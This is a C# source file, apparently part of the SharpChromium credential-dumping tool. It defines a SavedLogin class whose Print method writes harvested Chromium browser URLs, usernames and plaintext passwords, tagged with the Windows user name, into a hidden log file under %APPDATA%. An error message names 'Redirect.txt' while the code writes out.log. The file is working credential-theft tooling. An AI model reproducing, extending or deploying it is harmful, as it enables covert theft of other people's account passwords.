using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;


namespace SharpChromium
{
    class SavedLogin
    {
        public string Url;
        public string Username;
        public string Password;

        public SavedLogin(string url, string user, string pass)
        {
            Url = url;
            Username = user;
            Password = pass;
        }

        public void Print()
        {
            FileStream ostrm;
            StreamWriter writer;
            TextWriter oldOut = Console.Out;

            try
            {
                string location = "%APPDATA%/out.log";
                string str = Environment.ExpandEnvironmentVariables(location);
                ostrm = new FileStream(str, FileMode.OpenOrCreate, FileAccess.Write);
                writer = new StreamWriter(ostrm);
            }
            catch (Exception e)
            {
                Console.WriteLine("Cannot open Redirect.txt for writing");
                Console.WriteLine(e.Message);
                return;
            }

            Console.SetOut(writer);

            string user = Environment.GetEnvironmentVariable("USERNAME");
            Console.WriteLine("--- Chromium Credential (User: {0}) ---", user);
            Console.WriteLine("URL      : {0}", Url);
            Console.WriteLine("Username : {0}", Username);
            Console.WriteLine("Password : {0}", Password);
            Console.WriteLine();
            Console.SetOut(oldOut);
            writer.Close();
            ostrm.Close();
        }
    }
}
